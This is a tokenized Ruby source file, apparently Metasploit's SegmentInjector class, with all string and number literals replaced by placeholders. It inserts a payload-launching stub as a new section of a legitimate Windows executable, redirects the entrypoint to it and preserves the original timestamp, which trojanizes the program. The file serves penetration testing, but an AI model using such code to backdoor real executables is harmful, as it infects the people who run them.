module Msf module Exe require <str> class SegmentInjector attr_accessor <str> attr_accessor <str> attr_accessor <str> attr_accessor <str> def initialize ( opts = { } ) @payload = opts [ <str> ] @template = opts [ <str> ] @arch = opts [ <str> ] || <str> @buffer_register = opts [ <str> ] x86_regs = <str> x64_regs = <str> + ( <int> .. <int> ) . map { | n | <str> n <str> } @buffer_register || = if @arch == <str> <str> else <str> end if @arch == <str> && ! x86_regs . include? ( @buffer_register . downcase ) raise ArgumentError , <str> elsif @arch == <str> && ! x64_regs . include? ( @buffer_register . downcase ) raise ArgumentError , <str> end end def processor case @arch when <str> return Metasm :: Ia32 . new when <str> return Metasm :: X86_64 . new else raise <str> end end def create_thread_stub case @arch when <str> create_thread_stub_x86 when <str> create_thread_stub_x64 else raise <str> end end def create_thread_stub_x64 <<- <str> EOS <str> <str> EOS end def create_thread_stub_x86 <<- <str> EOS <str> <str> EOS end def payload_stub ( prefix ) asm = <str> prefix <str> asm << create_thread_stub shellcode = Metasm :: Shellcode . assemble ( processor , asm ) shellcode . encoded + @payload end def is_warbird? ( pe ) pattern = <str> section = pe . sections . find { | s | s . name . to_s == <str> } if section && section . encoded . pattern_scan ( pattern ) . blank? return false end true end def generate_pe pe_orig = Metasm :: PE . decode_file ( template ) if is_warbird? ( pe_orig ) raise RuntimeError , <str> end pe = pe_orig . mini_copy pe . mz . encoded = pe_orig . encoded [ <int> , pe_orig . coff_offset - <int> ] pe . mz . encoded . export = pe_orig . encoded [ <int> , <int> ] . export . dup pe . header . time = pe_orig . header . time pe . optheader . dll_characts . delete ( <str> ) prefix = dll_prefix ( pe ) s = Metasm :: PE :: Section . new s . name = <str> s . encoded = payload_stub ( prefix ) s . characteristics = <str> if pe . optheader . entrypoint != <int> s . encoded . fixup! ( <str> = > pe . optheader . image_base + pe . optheader . entrypoint ) end pe . sections << s pe . invalidate_header pe . optheader . entrypoint = <str> pe . cpu = pe_orig . cpu pe . encode_string end def dll_prefix ( pe ) prefix = <str> if pe . header . characteristics . include? <str> if pe . optheader . entrypoint == <int> prefix = <str> else prefix = <str> end end prefix end end end end 
